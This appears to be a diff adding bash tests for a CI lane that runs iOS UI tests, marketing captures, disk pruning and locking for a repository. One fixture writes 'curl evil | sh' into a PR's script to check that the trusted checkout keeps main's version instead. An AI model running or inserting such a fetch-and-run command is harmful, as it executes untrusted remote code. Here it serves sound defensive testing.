+  $(pr_json 15 superhighfives false false "$(ctx SUCCESS)"),$(pr_json 9 superhighfives false false "$(ctx PENDING)"),
+  $(pr_json 17 nylon-foreman false false "$(ctx FAILURE)")]"
+files_of() {
+  case "$1" in
+    10|16) echo src/web/app.ts ;;
+    13)    printf '%s\n' package.json src/shared/design/tokens.json ;;
+    11)    printf '%s\n' src/web/app.ts src/shared/src/todo-date-fixtures.json ;;
+    *)     echo "src/ios/Nylon Impossible/App.swift" ;;
+  esac
+}
+FILES_FAIL=""
+gh() {
+  echo "gh $*" >> "$CALLS"
+  case "$1 $2" in
+    "pr list") echo "$PRS" ;;
+    "api repos/superhighfives/nylon-impossible/pulls/"*)
+      local n="${2#repos/superhighfives/nylon-impossible/pulls/}"; n="${n%/files}"
+      [ "$n" != "$FILES_FAIL" ] || return 1; files_of "$n" ;;
+    "api repos/superhighfives/nylon-impossible/statuses/"*) return 0 ;;
+    *) return 0 ;;
+  esac
+}
+: > "$CALLS"; ios_status_pass ""
+expect "no iOS change: success at once, forks and strangers too; an untrusted iOS change: failure" \
+  "sha10 success No iOS change|sha12 failure $NOT_RUN|sha13 failure $NOT_RUN|sha16 success No iOS change" "$(statuses)"
+expect "trusted iOS PRs queue, oldest first, a draft waits, and a final status is left alone" \
+  "9 sha9 pending|11 sha11 none" "$(tr '\t' ' ' <<<"$IOS_QUEUE" | grep . | paste -sd'|' -)"
+expect "a head that has its status isn't read again" "no no" "$(called 'pulls/15/files') $(called 'pulls/17/files')"
+expect "a description fits GitHub's 140 characters" yes "$([ "${#NOT_RUN}" -le 140 ] && echo yes)"
+
+: > "$CALLS"; FILES_FAIL=10; ios_status_pass ""
+expect "a file list that can't be read posts nothing for that PR" no "$(called 'statuses/sha10')"
+FILES_FAIL=""
+: > "$CALLS"; ios_status_pass "deps, ui-test"
+expect "ui-test off: no statuses, nothing queued" "|" "$(statuses)|$IOS_QUEUE"
+: > "$CALLS"; DRY=1 ios_status_pass ""
+expect "a dry run posts nothing" "" "$(grep 'statuses/' "$CALLS")"
+
+# ---- a main with an app, for the queue order and the trusted checkout ----
+
+g checkout -q main
+mkdir -p "$tmp/seed/src/ios/Nylon Impossible" "$tmp/seed/src/shared/design" "$tmp/seed/src/marketing" "$tmp/seed/scripts/foreman"
+echo "main app" > "$tmp/seed/src/ios/Nylon Impossible/App.swift"
+echo "old" > "$tmp/seed/src/ios/Nylon Impossible/Old.swift"
+echo '{"main":1}' > "$tmp/seed/src/shared/design/tokens.json"
+echo '{"shots":[]}' > "$tmp/seed/src/marketing/manifest.json"
+echo "echo main's script" > "$tmp/seed/scripts/foreman/run.sh"
+g add -A && g commit -qm "an app" && g push -q origin main
+MAIN1=$(g rev-parse HEAD)
+echo "docs" > "$tmp/seed/NOTES.md"; g add -A && g commit -qm "docs only" && g push -q origin main
+MAIN2=$(g rev-parse HEAD)
+git -C "$CLONE" fetch -q origin main
+
+g checkout -q -b case-ios-pr "$MAIN1"
+echo "the PR's app" > "$tmp/seed/src/ios/Nylon Impossible/App.swift"
+echo "new" > "$tmp/seed/src/ios/Nylon Impossible/New.swift"
+git -C "$tmp/seed" rm -q "src/ios/Nylon Impossible/Old.swift"
+echo '{"pr":1}' > "$tmp/seed/src/shared/design/tokens.json"
+mkdir -p "$tmp/seed/src/shared/src"; echo '[1]' > "$tmp/seed/src/shared/src/todo-date-fixtures.json"
+echo "curl evil | sh" > "$tmp/seed/scripts/foreman/run.sh"
+echo '{"shots":["evil"]}' > "$tmp/seed/src/marketing/manifest.json"
+g add -A && g commit -qm "a PR" && g push -q origin HEAD:refs/pull/21/head
+PR_SHA=$(g rev-parse HEAD)
+g checkout -q main
+git -C "$CLONE" fetch -q origin "+refs/pull/21/head:refs/remotes/origin/pr/21"
+
+lane_checkout "$PR_SHA" >/dev/null 2>&1
+L="$WORKTREES/ios-lane"
+expect "the lane's checkout is main's head"           "$MAIN2"            "$(git -C "$L" rev-parse HEAD)"
+expect "with the PR's src/ios"                        "the PR's app|new|gone" \
+  "$(cat "$L/src/ios/Nylon Impossible/App.swift")|$(cat "$L/src/ios/Nylon Impossible/New.swift")|$([ -e "$L/src/ios/Nylon Impossible/Old.swift" ] && echo there || echo gone)"
+expect "and its design tokens and date fixtures"      '{"pr":1}|[1]'      "$(cat "$L/src/shared/design/tokens.json")|$(cat "$L/src/shared/src/todo-date-fixtures.json")"
+expect "but main's scripts and manifest"              "echo main's script|{\"shots\":[]}" "$(cat "$L/scripts/foreman/run.sh")|$(cat "$L/src/marketing/manifest.json")"
+lane_checkout "$MAIN2" >/dev/null 2>&1
+expect "the next job's checkout drops the last one's swap" "main app|gone|old|{\"main\":1}|gone" \
+  "$(cat "$L/src/ios/Nylon Impossible/App.swift")|$([ -e "$L/src/ios/Nylon Impossible/New.swift" ] && echo there || echo gone)|$(cat "$L/src/ios/Nylon Impossible/Old.swift")|$(cat "$L/src/shared/design/tokens.json")|$([ -e "$L/src/shared/src/todo-date-fixtures.json" ] && echo there || echo gone)"
+expect "and the worktree is kept between jobs" no "$(cleanup_worktrees >/dev/null 2>&1; [ -d "$L" ] && echo no || echo yes)"
+
+# The order: PR heads, then main after a merge, then the captures.
+rm -f "$IOS/ui-test-main" "$IOS/captured"
+IOS_QUEUE=$'9\tsha9\tpending\n11\tsha11\tnone\n'
+ios_next "$MAIN1" ""; expect "PR heads first, oldest first"           "ui-test sha9 9"      "$IOS_NEXT"
+IOS_QUEUE=""
+ios_next "$MAIN1" ""; expect "then main, which hasn't run"             "ui-test $MAIN1 main" "$IOS_NEXT"
+printf '%s\n%s\n' "$MAIN1" "$(ios_revision "$MAIN1" ios)" > "$IOS/ui-test-main"
+ios_next "$MAIN1" ""; expect "then the captures"                       "captures $MAIN1"     "$IOS_NEXT"
+ios_revision "$MAIN1" capture > "$IOS/captured"
+ios_next "$MAIN1" ""; expect "then nothing"                            ""                    "$IOS_NEXT"
+: > "$CALLS"; ios_next "$MAIN2" ""
+expect "a merge that left the app alone: main's status without a build" "$MAIN2 success No iOS change since ${MAIN1:0:7}|" "$(statuses)|$IOS_NEXT"
+expect "and it's remembered"                                            "$MAIN2"              "$(sed -n 1p "$IOS/ui-test-main")"
+expect "the capture revision is the iOS paths' and the manifest's ids" \
+  "src/ios src/marketing/manifest.json src/shared/design src/shared/src/todo-date-fixtures.json -" \
+  "$(ios_revision "$MAIN1" capture | jq -r 'keys | join(" ")') $(ios_revision "$MAIN1" capture | jq -r '.["src/shared/src/todo-date-fixtures.json"]')"
+rm -f "$IOS/captured" "$IOS/ui-test-main"
+IOS_QUEUE=$'11\tsha11\tnone\n'
+ios_next "$MAIN1" "ui-test"; expect "ui-test off: straight to the captures" "captures $MAIN1" "$IOS_NEXT"
+ios_next "$MAIN1" "ui-test,captures"; expect "both off: nothing"            ""                "$IOS_NEXT"
+IOS_QUEUE=""
+
+# A superseded head never runs.
+: > "$CALLS"
+gh() { echo "gh $*" >> "$CALLS"; case "$1 $2" in "pr view") echo "sha-newer" ;; *) return 0 ;; esac; }
+ui_test_job sha11 11
+expect "a PR that moved on isn't tested, and gets no status" "no no" "$(called 'statuses/') $(called 'worktree')"
+
+# A checkout that fails leaves the head pending, which the queue picks up again.
+: > "$CALLS"
+gh() { echo "gh $*" >> "$CALLS"; return 0; }
+eval "$(declare -f lane_checkout | sed '1s/^/real_/')"
+lane_checkout() { return 1; }
+ui_test_job sha12 main
+expect "a failed checkout stays pending, for the next tick" "sha12 pending Couldn't check it out on the Mac mini; the next tick tries again" "$(statuses)"
+expect "and its head is queued again" $'12\tsha12\trun\tpending' \
+  "$(ui_test_candidates <<<'[{"number":12,"headRefOid":"sha12","author":{"login":"nylon-foreman"},"isDraft":false,"isCrossRepository":false,"statusCheckRollup":[{"context":"foreman/ios-ui-test","state":"PENDING"}]}]')"
+eval "$(declare -f real_lane_checkout | sed '1s/^real_//')"
+
+# Xcode and the capture scripts are the commit's code: they never see the token.
+expect "the UI tests, captures and fix-shots run without the token" 3 "$(grep -c 'env -u GH_TOKEN -u GITHUB_TOKEN' "$here/foreman.sh")"
+
+# The status's words, from xcresulttool's summary.json.
+verdict() { ui_test_verdict "$1" <<<"$2" | tr '\t' '|'; }
+expect "all passed"  "success|All 42 passed" "$(verdict 0 '{"result":"Passed","passedTests":42,"failedTests":0,"skippedTests":0,"testFailures":[]}')"
+expect "passed, one on retry" "success|Passed, 1 on retry: testDoneUnderLoad" \
+  "$(verdict 0 '{"result":"Passed","passedTests":42,"failedTests":0,"testFailures":[{"testName":"testDoneUnderLoad()","testIdentifierString":"DoneAndScrollingUITests/testDoneUnderLoad()","failureText":"x"}]}')"
+expect "two failed, each named once" "failure|2 failed: testDoneUnderLoad, testDoneHoldsInPlaceThenLeavesWithUndo" \
+  "$(verdict 65 '{"result":"Failed","passedTests":40,"failedTests":2,"testFailures":[{"testName":"testDoneUnderLoad()","failureText":"a"},{"testName":"testDoneUnderLoad()","failureText":"b"},{"testIdentifierString":"DoneAndScrollingUITests/testDoneHoldsInPlaceThenLeavesWithUndo()","failureText":"c"}]}')"
+expect "a skip on the mini is said out loud" "success|40 passed, 2 skipped" "$(verdict 0 '{"result":"Passed","passedTests":40,"skippedTests":2,"testFailures":[]}')"
+many=$(jq -cn '{result:"Failed", failedTests:12, testFailures:[range(12) | {testName:"testAccessibilityAuditOfTheRoute\(.)()"}]}')
+long=$(ui_test_verdict 65 <<<"$many" | cut -f2)
+cut_short() { case "$1" in "12 failed: testAccessibilityAuditOfTheRoute0, "*", …") echo yes ;; *) echo "no: $1" ;; esac; }
+expect "a long list fits 140 characters, and says it's cut" "yes yes" \
+  "$([ "$(jq -rn --arg s "$long" '$s | length')" -le 140 ] && echo yes) $(cut_short "$long")"
+expect_prefix "no results: a failure that says so" "failure|No test results (xcodebuild exit 65)" "$(verdict 65 '')"
+expect "a time-out says so"                         "failure|Timed out after 45 minutes"       "$(verdict 142 '{"result":"Passed","passedTests":1}')"
+
+# ---- the captures ----
+
+PUSHED() { git -C "$tmp/origin.git" rev-parse -q --verify refs/heads/marketing-ios 2>/dev/null || echo none; }
+CAPTURE=fresh CAPTURE_EXIT=0
+run_capture() { # writes what generate.ts would, per $CAPTURE
+  local out="$1/src/marketing/source"
+  echo "run_capture $(git -C "$1" rev-parse HEAD) $(cat "$1/src/ios/Nylon Impossible/App.swift")" >> "$CALLS"
+  echo "png $RANDOM" > "$out/ios-iphone-today-light.png"; echo png > "$out/parity/ios-composer-dark.png"
+  jq -n --arg c "$CAPTURE" '{"ios-iphone-today-light": "fresh", "parity/ios-composer-dark": $c}' > "$out/capture-status.json"
+  return "$CAPTURE_EXIT"
+}
+gh() { echo "gh $*" >> "$CALLS"; return 0; }
+: > "$CALLS"; rm -f "$IOS/capture-failures" "$IOS/captured"
+captures_job "$MAIN1"
+first=$(PUSHED)
+expect "a good capture is pushed to marketing-ios" yes "$([ "$first" != none ] && echo yes)"
+expect "as one commit, with no parent, holding the shots, their status and revision" \
+  "capture-status.json revision.json source/ios-iphone-today-light.png source/parity/ios-composer-dark.png|1" \
+  "$(git -C "$tmp/origin.git" ls-tree -r --name-only marketing-ios | paste -sd' ' -)|$(git -C "$tmp/origin.git" rev-list --count marketing-ios)"
+expect "revision.json names the commit and its tree ids" "$MAIN1 yes" \
+  "$(git -C "$tmp/origin.git" show marketing-ios:revision.json | jq -r .sha) $([ "$(git -C "$tmp/origin.git" show marketing-ios:revision.json | jq -S -c .trees)" = "$(ios_revision "$MAIN1" capture)" ] && echo yes)"
+expect "then marketing.yml is dispatched, lenient" yes "$(called 'gh workflow run marketing.yml -R superhighfives/nylon-impossible --ref main -f strict=false')"
+expect "it captured main's checkout of that commit" "run_capture $MAIN2 main app" "$(grep run_capture "$CALLS")"
+expect "and the revision is remembered" "$(ios_revision "$MAIN1" capture)" "$(cat "$IOS/captured")"
+captures_job "$MAIN1"
+expect "the next push replaces it: still one commit" "yes 1" \
+  "$([ "$(PUSHED)" != "$first" ] && echo yes) $(git -C "$tmp/origin.git" rev-list --count marketing-ios)"
+
+: > "$CALLS"; before=$(PUSHED); CAPTURE=cached
+captures_job "$MAIN1"
+expect "a capture that reused a shot pushes nothing" "$before" "$(PUSHED)"
+expect "but marketing.yml is still dispatched, to publish the last good set" yes "$(called 'gh workflow run marketing.yml')"
+expect "it's a failed captures event, and one isn't an alert" "yes no" "$(called 'routine_event captures failed') $(called 'alert ')"
+: > "$CALLS"; CAPTURE_EXIT=142
+captures_job "$MAIN1"
+expect "two in a row is an alert" yes "$(called 'alert the iOS marketing captures failed 2 times in a row')"
+expect "a time-out says so" yes "$(called 'timed out after 45 minutes')"
+expect "nothing pushed" "$before" "$(PUSHED)"
+: > "$CALLS"; CAPTURE=fresh CAPTURE_EXIT=0
+captures_job "$MAIN1"
+expect "a good one ends the streak" "no ok" "$([ -e "$IOS/capture-failures" ] && echo yes || echo no) $(grep -oE 'routine_event captures [a-z]+' "$CALLS" | awk '{print $3}')"
+
+# ---- disk ----
+
+DU_KB="ui-test=$((9 * 1048576)) marketing=$((5 * 1048576)) fix-shots-ios=$((4 * 1048576)) fix-shots-mac=$((1 * 1048576))"
+du() { local p="${*: -1}" kv; for kv in $DU_KB; do [ "${p##*/}" != "${kv%%=*}" ] || printf '%s\t%s\n' "${kv#*=}" "$p"; done; }
+rm -rf "$DERIVED"; mkdir -p "$DERIVED"/{ui-test,marketing,fix-shots-ios,fix-shots-mac}
+touch -t 202611010100 "$DERIVED/fix-shots-mac"; touch -t 202611010200 "$DERIVED/fix-shots-ios"
+touch -t 202611010300 "$DERIVED/marketing";     touch -t 202611010400 "$DERIVED/ui-test"
+derived_now() { (cd "$DERIVED" && printf '%s\n' *) | sort | paste -sd' ' -; }
+derived_prune
+expect "over 15GB (19): the least recently used go first, until it's under" "marketing ui-test" "$(derived_now)"
+derived_prune
+expect "under the cap, nothing more goes" "marketing ui-test" "$(derived_now)"
+# shellcheck disable=SC2012 # the folder names are fixed
+expect "a job's folder is marked used when it starts" "$DERIVED/fix-shots-ios yes" \
+  "$(derived_for fix-shots-ios) $([ "$(ls -1t "$DERIVED" | head -1)" = fix-shots-ios ] && echo yes)"
+unset -f du
+
+FREE_KB=$((8 * 1048576))
+df() { printf 'Filesystem 1024-blocks Used Available Capacity Mounted\n/dev/disk3s5 1 1 %s 96%% /\n' "$FREE_KB"; }
+start_ios_job() { echo "start_ios_job $*" >> "$CALLS"; }
+lane_busy() { return 1; }
+rm -rf "$ONCE"; : > "$CALLS"; rm -f "$IOS/ui-test-main" "$IOS/captured"
+ios_pass ""
+expect "under 10GB free, nothing starts" no "$(called start_ios_job)"
+expect "the owner hears once, with an ios_skipped event" "yes yes" "$(called 'alert the iOS lane is stopped: the Mac mini has 8GB free') $(called 'event ios_skipped')"
+expect "and the gate can say why" "8GB free, under the 10GB an iOS job needs" "$(cat "$IOS/low-disk")"
+: > "$CALLS"; ios_pass ""
+expect "once a day" "no no" "$(called alert) $(called 'event ')"
+FREE_KB=$((20 * 1048576)); : > "$CALLS"
+ios_pass ""
+expect "with room, main's UI tests start" "start_ios_job ui-test $MAIN2 main" "$(grep start_ios_job "$CALLS")"
+expect "and the gate's note goes" no "$([ -e "$IOS/low-disk" ] && echo yes || echo no)"
+lane_busy() { return 0; }; : > "$CALLS"
+ios_pass ""
+expect "a busy lane starts nothing" no "$(called start_ios_job)"
+unset -f df
+
+# ---- the tidy ----
+
+: > "$APPLE_CALLS"
+FAKE_SIMS='{"devices":{"r":[{"name":"Nylon UI Test iPhone","udid":"U1"},{"name":"Someone Else","udid":"U2"}]}}' ios_tidy
+expect "the tests' xcrun is the fake on PATH" "$tmp/bin/xcrun" "$(command -v xcrun)"
+expect "the tidy shuts down our booted simulators, through the fake" \
+  "xcrun simctl shutdown U1|xcrun simctl delete unavailable" \
+  "$(grep -E 'shutdown|delete' "$APPLE_CALLS" | paste -sd '|' -)"
+
+# ---- the lock ----
+
+eval "$(declare -f real_lane_busy | sed '1s/^real_//')"
+sleep 30 & other=$!
+rm -rf "$LANE"; mkdir -p "$LANE"; echo "$other" > "$LANE/pid"
+expect "a live process holds the lane" yes "$(yn lane_busy)"
+expect "and it isn't a build: it doesn't count toward the job limit" "" "$(running_jobs)"
+LANE_WAIT=0 LANE_POLL=0
+expect "a wait for it gives up" no "$(yn lane_wait shots 0)"
+gh() { echo "gh $*" >> "$CALLS"; case "$1 $2" in "pr view") echo "## Try it" ;; *) return 0 ;; esac; }
+echo '{"shots":[{"device":"iphone","screen":"today"}]}' > "$tmp/plan.json"
+: > "$CALLS"; FREE_KB=""; fix_shots 31 30 foreman/30-x "$tmp/plan.json"
+expect "fix-shots gives up best-effort, and says so in Try it" yes "$(called "Not taken: the Mac mini's iOS lane was busy")"
+kill "$other" 2>/dev/null; wait "$other" 2>/dev/null
+expect "a lock whose process has gone is cleared" "no gone" "$(yn lane_busy) $([ -d "$LANE" ] && echo there || echo gone)"
+expect "and the lane can be taken, and let go" "yes $$ gone" "$(yn lane_take x) $(cat "$LANE/pid") $(lane_release; [ -d "$LANE" ] && echo there || echo gone)"
+
+# fix-shots keeps its DerivedData in ~/.foreman/derived, never /tmp.
+# shellcheck disable=SC2016 # the source text, unexpanded
+expect "fix-shots' DerivedData is under ~/.foreman/derived" "yes yes" \
+  "$(grep -q 'FIX_SHOTS_DERIVED_DATA_IOS="$(derived_for fix-shots-ios)"' "$here/foreman.sh" && echo yes) $(grep -q 'MARKETING_DERIVED_DATA="$(derived_for marketing)"' "$here/foreman.sh" && echo yes)"
+
+# The digest.
+EVENTS="$tmp/lane-events.jsonl"; : > "$EVENTS"
+eval "$(declare -f real_event | sed 's/^real_event/event/')"
+routine_event() { jq -cn --arg r "$1" --arg o "$2" --arg n "${3:-}" '{ts:"2026-11-01T07:00:00Z", event:"routine", routine:$r, outcome:$o, note:$n}' >> "$EVENTS"; }
+routine_event ui-test retry "main at abc1234: Passed, 1 on retry: testDoneUnderLoad"
+routine_event ui-test failed "main at abc1234: 2 failed: testDoneUnderLoad, testX"
+routine_event captures failed "abc1234: not every shot was captured (exit 1)"
+stalled_prs() { :; }
+expect "the digest lists the lane's problems" \
+  "- The iOS UI tests passed on main at abc1234: 1 on retry: testDoneUnderLoad|- The iOS UI tests failed on main at abc1234: 2 failed: testDoneUnderLoad, testX|- The iOS marketing captures failed (abc1234: not every shot was captured (exit 1)); marketing.yml used the last good set" \
+  "$(digest_problems "$(( FOREMAN_NOW - 86400 ))" | paste -sd'|' -)"
 
 echo
 echo "$pass passed, $fail failed"
